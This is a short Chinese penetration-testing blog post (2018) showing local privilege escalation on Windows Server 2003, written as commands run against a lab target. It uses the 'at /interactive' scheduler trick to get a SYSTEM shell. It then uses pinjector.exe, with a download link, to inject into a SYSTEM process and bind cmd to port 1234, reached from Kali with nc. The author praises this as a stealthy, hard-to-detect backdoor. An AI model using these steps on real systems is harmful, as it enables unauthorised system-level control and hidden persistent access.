Windows-Sever-2003-提权

Posted on 2018-12-09 | In 内网渗透

本地提权

Administrator 提权至 System 权限

测试机：Windows Sever 2003

C:\Documents and Settings\Administrator>at 10:31 /interactive cmd

新加了一项作业，其作业 ID = 2 #10:31 启动cmd命令行

cmd 权限变更为 system

explorer.exe # 桌面进程 此时用户是Administrator

结束进程后 利用 cmd 的 taskmgr 命令启动任务管理器 重新创建 explorer.exe 进程 此时用户已变更为 system

注入进程提权

注入进程提权：相当于开了一个后门,隐蔽性极高,不会创建新的进程,很难发现，便于进行隐蔽的监听

pinjector.exe程序下载地址：https://www.tarasco.org/security/Process_Injector/index.html

靶机：win server2003

ip：192.168.195.129

  1. cmd 运行 pinjector.exe 程序

pinjector # 参数及说明
pinjector -l # 列出当前执行的进程及其相应的用户名
pinjector -p pid cmd port # 对pid进程执行注入

  1. 查看当前进程及用户

此时1234端口未被占用

  1. 选取进程进行注入

pinjector -p 440 cmd 1234

  1. 再次查看1234端口发现被占用

  1. 同时kali中可以利用nc进行监听，获取system权限
